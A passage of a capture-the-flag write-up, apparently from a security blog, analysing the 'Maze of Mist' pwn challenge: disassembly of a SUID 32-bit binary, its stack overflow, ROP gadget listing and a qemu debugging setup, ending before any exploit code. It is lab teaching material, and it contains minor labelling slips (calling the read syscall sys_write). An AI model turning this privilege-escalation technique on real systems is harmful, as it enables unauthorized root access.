@@ -1,0 +1,339 @@
+<!doctype html><html lang="en"><head><title>Maze of Mist | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="32-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="32-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`"><meta itemprop="keywords" content><meta itemprop="name" content="Maze of Mist"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="32-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Maze of Mist"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/maze-of-mist/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="32-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`"><meta name="twitter:description" content="32-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Maze of Mist"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/maze-of-mist/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/maze-of-mist/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/maze-of-mist/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/maze-of-mist/&amp;text=Maze%20of%20Mist" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/maze-of-mist/&amp;title=Maze%20of%20Mist" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Maze of Mist</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a></li><li><a href="#setup-environment">Setup environment</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a compressed <code>vmlinuz-linux</code> kernel image, an <code>initramfs.cpio.gz</code> filesystem and a <code>run.sh</code> script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -l <span class="mtku">pwn_maze_of_mist.zip</span>
+Archive:  pwn_maze_of_mist.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2024-02-06 09:30   maze_of_mist/
+  1347202  2024-02-06 09:29   maze_of_mist/initramfs.cpio.gz  
+      291  2024-02-06 09:26   maze_of_mist/run.sh
+ 12886816  2024-02-06 09:26   maze_of_mist/vmlinuz-linux
+---------                     -------
+ 14234309                     4 files
+
+<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> <span class="mtku">pwn_maze_of_mist.zip</span>
+Archive:  pwn_maze_of_mist.zip
+   creating: maze_of_mist/
+  inflating: maze_of_mist/initramfs.cpio.gz
+  inflating: maze_of_mist/run.sh
+  inflating: maze_of_mist/vmlinuz-linux
+</code></pre></div><p>If we decompress the filesystem, we find a 32-bit binary called <code>target</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">maze_of_mist</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">gunzip</span> -k <span class="mtku">initramfs.cpio.gz</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">mkdir</span> initramfs
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">initramfs</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cpio</span> -idm &lt; <span class="mtku">../initramfs.cpio</span>
+4959 blocks
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ls</span>
+<span class="code-blue">bin</span>  <span class="code-blue">dev</span>  <span class="code-blue">etc</span>  <span class="code-blue">home</span>  <span class="code-green">init</span>  <span class="code-red">initramfs.cpio.gz</span>  <span class="code-cyan">linuxrc</span>  <span class="code-blue">mnt</span>  <span class="code-blue">proc</span>  <span class="code-blue">root</span>  <span class="code-blue">sbin</span>  <span class="code-blue">sys</span>  <span class="code-green">target</span>  <span class="code-blue">usr</span>  <span class="code-blue">var</span>  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">target</span>
+target: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
+</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>The binary is incredibly small:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">target</span>
+
+target:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 &lt;_vuln&gt;:
+ 8049000:       b8 03 00 00 00          mov    eax,0x3
+ 8049005:       31 db                   xor    ebx,ebx
+ 8049007:       8d 4c 24 e0             lea    ecx,[esp-0x20]
+ 804900b:       ba 00 02 00 00          mov    edx,0x200
+ 8049010:       cd 80                   int    0x80
+ 8049012:       31 c0                   xor    eax,eax
+ 8049014:       c3                      ret
+
+08049015 &lt;_start&gt;:
+ 8049015:       b8 04 00 00 00          mov    eax,0x4
+ 804901a:       bb 01 00 00 00          mov    ebx,0x1
+ 804901f:       b9 00 a0 04 08          mov    ecx,0x804a000
+ 8049024:       ba 4a 00 00 00          mov    edx,0x4a
+ 8049029:       cd 80                   int    0x80
+ 804902b:       e8 d0 ff ff ff          call   8049000 &lt;_vuln&gt;  
+ 8049030:       b8 01 00 00 00          mov    eax,0x1
+ 8049035:       31 db                   xor    ebx,ebx
+ 8049037:       cd 80                   int    0x80
+</code></pre></div><p>It is using only three <a target="_blank" href="https://syscalls32.paolostivanin.com/"><code>syscall</code> instructions</a>: <code>sys_exit</code> (<code>$eax = 0x1</code>), <code>sys_write</code> (<code>$eax = 0x3</code>) and <code>sys_write</code> (<code>$eax = 0x4</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">08049000 <span class="mtk9">&lt;_vuln&gt;</span>:
+ 8049000:       <span class="mtk8">mov</span>    <span class="mtk7">eax</span>, <span class="mtk6">0x3</span>
+ 8049005:       <span class="mtk8">xor</span>    <span class="mtk7">ebx</span>, <span class="mtk7">ebx</span>
+ 8049007:       <span class="mtk8">lea</span>    <span class="mtk7">ecx</span>, <span class="mtk5">[<span class="mtk7">esp</span> - <span class="mtk6">0x20</span>]</span>
+ 804900b:       <span class="mtk8">mov</span>    <span class="mtk7">edx</span>, <span class="mtk6">0x200</span>
+ 8049010:       <span class="mtk8">int</span>    <span class="mtk6">0x80</span>              <span class="mtk3"># read(0, $ecx, 0x200)</span>
+ 8049012:       <span class="mtk8">xor</span>    <span class="mtk7">eax</span>, <span class="mtk7">eax</span>
+ 8049014:       <span class="mtk8">ret</span>
+
+08049015 <span class="mtk9">&lt;_start&gt;</span>:
+ 8049015:       <span class="mtk8">mov</span>    <span class="mtk7">eax</span>, <span class="mtk6">0x4</span>
+ 804901a:       <span class="mtk8">mov</span>    <span class="mtk7">ebx</span>, <span class="mtk6">0x1</span>
+ 804901f:       <span class="mtk8">mov</span>    <span class="mtk7">ecx</span>, <span class="mtk6">0x804a000</span>
+ 8049024:       <span class="mtk8">mov</span>    <span class="mtk7">edx</span>, <span class="mtk6">0x4a</span>
+ 8049029:       <span class="mtk8">int</span>    <span class="mtk6">0x80</span>              <span class="mtk3"># write(1, 0x804a000, 0x80)</span>  
+ 804902b:       <span class="mtk8">call</span>   <span class="mtk9">&lt;_vuln&gt;</span>
+ 8049030:       <span class="mtk8">mov</span>    <span class="mtk7">eax</span>, <span class="mtk6">0x1</span>
+ 8049035:       <span class="mtk8">xor</span>    <span class="mtk7">ebx</span>, <span class="mtk7">ebx</span>
+ 8049037:       <span class="mtk8">int</span>    <span class="mtk6">0x80</span>              <span class="mtk3"># exit(0)</span>
+</code></pre></div><p>There is a clear Buffer Overflow vulnerability in <code>_vuln</code>, because the program reserves only <code>0x20</code> bytes on the stack (<code>$esp</code>), but the program uses <code>read</code> with a maximum size of <code>0x200</code>. As a result, we can modify the return address and redirect the program execution to other points of the program.</p><p>The problem here is that we have NX enabled, so we can&rsquo;t simply use shellcode:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     i386-32-little
+RELRO:    <span class="code-dark-red">No RELRO</span>
+Stack:    <span class="code-dark-red">No canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-red">No PIE (0x8048000)</span>  
+</code></pre></div><p>Therefore, we must use Return-Oriented Programming (ROP) to execute arbitrary code. The problem is that the binary is very small, and we don&rsquo;t have enough ROP gadgets to exploit the program:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">target</span>
+Gadgets information
+============================================================
+0x08049022 : add al, 8 ; mov edx, 0x4a ; int 0x80
+0x0804900d : add al, byte ptr [eax] ; add ch, cl ; xor byte ptr [ecx], 0xc0 ; ret
+0x0804900e : add byte ptr [eax], al ; int 0x80
+0x08049033 : add byte ptr [eax], al ; xor ebx, ebx ; int 0x80
+0x0804900c : add byte ptr [edx], al ; add byte ptr [eax], al ; int 0x80
+0x0804900f : add ch, cl ; xor byte ptr [ecx], 0xc0 ; ret
+0x08049031 : add dword ptr [eax], eax ; add byte ptr [eax], al ; xor ebx, ebx ; int 0x80
+0x08049009 : and al, 0xe0 ; mov edx, 0x200 ; int 0x80
+0x08049008 : dec esp ; and al, 0xe0 ; mov edx, 0x200 ; int 0x80
+0x08049010 : int 0x80
+0x08049007 : lea ecx, [esp - 0x20] ; mov edx, 0x200 ; int 0x80
+0x0804900a : loopne 0x8048fc6 ; add byte ptr [edx], al ; add byte ptr [eax], al ; int 0x80  
+0x08049030 : mov eax, 1 ; xor ebx, ebx ; int 0x80
+0x0804900b : mov edx, 0x200 ; int 0x80
+0x08049024 : mov edx, 0x4a ; int 0x80
+0x08049023 : or byte ptr [edx + 0x4a], bh ; int 0x80
+0x08049014 : ret
+0x08049011 : xor byte ptr [ecx], 0xc0 ; ret
+0x08049012 : xor eax, eax ; ret
+0x08049035 : xor ebx, ebx ; int 0x80
+
+Unique gadgets found: 20
+</code></pre></div><h2 id="setup-environment">Setup environment</h2><p>However, there is a reason why they gave us a full kernel image and a <code>qemu</code> script (<code>run.sh</code>). Actually, we can take a look at the <code>init</code> script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
+
+<span class="mtk5">export</span><span class="mtk1"> PS1</span><span class="mtk5">=</span><span class="mtk4">'\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\</span><span class="mtk4">w\[\033[00m\]\$ '</span>  
+
+<span class="mtk8">chown</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">root:root</span><span class="mtk1"> </span><span class="mtk4">/</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">0700</span><span class="mtk1"> </span><span class="mtk4">/root</span>
+
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">proc</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/proc</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">sysfs</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/sys</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">devpts</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">gid=</span><span class="mtk6">5</span><span class="mtk4">,mode=</span><span class="mtk6">0620</span><span class="mtk1"> </span><span class="mtk4">devpts</span><span class="mtk1"> </span><span class="mtk4">/dev/pts</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">devtmpfs</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">nosuid,mode=</span><span class="mtk6">0755</span><span class="mtk1"> </span><span class="mtk4">udev</span><span class="mtk1"> </span><span class="mtk4">/dev</span>
+
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">0400</span><span class="mtk1"> </span><span class="mtk4">/root/flag.txt</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk4">u+s</span><span class="mtk1"> </span><span class="mtk4">/target</span>
+
+<span class="mtk8">hostname</span><span class="mtk1"> </span><span class="mtk4">arena</span>
+<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk4">/proc/sys/kernel/randomize_va_space</span>
+
+<span class="mtk8">setsid</span><span class="mtk1"> </span><span class="mtk4">cttyhack</span><span class="mtk1"> </span><span class="mtk4">setuidgid</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1"> </span><span class="mtk4">/bin/sh</span>
+
+<span class="mtk8">umount</span><span class="mtk1"> </span><span class="mtk4">/proc</span><span class="mtk1"> &amp;&amp; </span><span class="mtk8">umount</span><span class="mtk1"> </span><span class="mtk4">/sys</span>
+<span class="mtk8">poweroff</span><span class="mtk1"> </span><span class="mtk6">-d</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk6">-f</span>
+</code></pre></div><p>Here we see some interesting things:</p><ul><li>We need to become <code>root</code> to read the flag</li><li>The <code>target</code> binary is SUID, so if we achieve arbitrary code execution, we can become <code>root</code></li><li>ASLR is disabled because <code>/proc/sys/kernel/randomize_va_space</code> has a <code>0</code></li></ul><p>First of all, we will modify this line to get <code>root</code> permissions once the <code>qemu</code> script starts (just for testing):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">setsid</span><span class="mtk1"> </span><span class="mtk4">cttyhack</span><span class="mtk1"> </span><span class="mtk4">setuidgid</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk4">/bin/sh</span>  <span class="mtk3"># 1000 /bin/sh</span>  
+</code></pre></div><p>Now, we will use the following <code>go.sh</code> script to compress the filesystem and start the kernel:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">initramfs</span>
+<span class="mtk8">find</span><span class="mtk1"> </span><span class="mtk4">.</span><span class="mtk1"> </span><span class="mtk6">-print0</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">cpio</span><span class="mtk1"> </span><span class="mtk6">--null</span><span class="mtk1"> </span><span class="mtk6">-ov</span><span class="mtk1"> </span><span class="mtk6">--format=newc</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk6">-9</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span>  
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span><span class="mtk1"> </span><span class="mtk4">..</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">..</span>
+
+<span class="mtk8">sh</span><span class="mtk1"> </span><span class="mtk4">run.sh</span>
+</code></pre></div><p>We can also add <code>-s</code> to the <code>qemu</code> script in order to debug later with GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
+
+<span class="mtk8">qemu-system-x86_64</span><span class="mtk1"> </span><span class="mtk6">-s</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-m</span><span class="mtk1"> </span><span class="mtk6">128</span><span class="mtk4">M</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-nographic</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-kernel</span><span class="mtk1"> </span><span class="mtk4">"./vmlinuz-linux"</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-append</span><span class="mtk1"> </span><span class="mtk4">"console=ttyS0 quiet loglevel=3 oops=panic panic=-</span><span class="mtk4">1 pti=on kaslr"</span><span class="mtk1"> </span><span class="mtk6">\</span>  
+<span class="mtk1">    </span><span class="mtk6">-monitor</span><span class="mtk1"> </span><span class="mtk4">/dev/null</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-initrd</span><span class="mtk1"> </span><span class="mtk4">"./initramfs.cpio.gz"</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-cpu</span><span class="mtk1"> </span><span class="mtk4">qemu64,+smep,+smap,+rdrand</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">    </span><span class="mtk6">-smp</span><span class="mtk1"> </span><span class="mtk4">cores=</span><span class="mtk6">2</span>
+</code></pre></div><p>At this point, we can launch <code>qemu</code> and run the binary inside the kernel:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># /target
+Where to go, challenger? your fractured reflection is your only guide.  
+&gt; asdf
+<span class="code-green">root@arena</span>:<span class="code-blue">/</span># /target
+Where to go, challenger? your fractured reflection is your only guide.
+&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+</code></pre></div><h2 id="exploit-strategy">Exploit strategy</h2><p>We are not able to reuse the instructions in the binary to gain arbitrary code execution using ROP. But there&rsquo;s more regions of memory loaded in the program:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># /target &
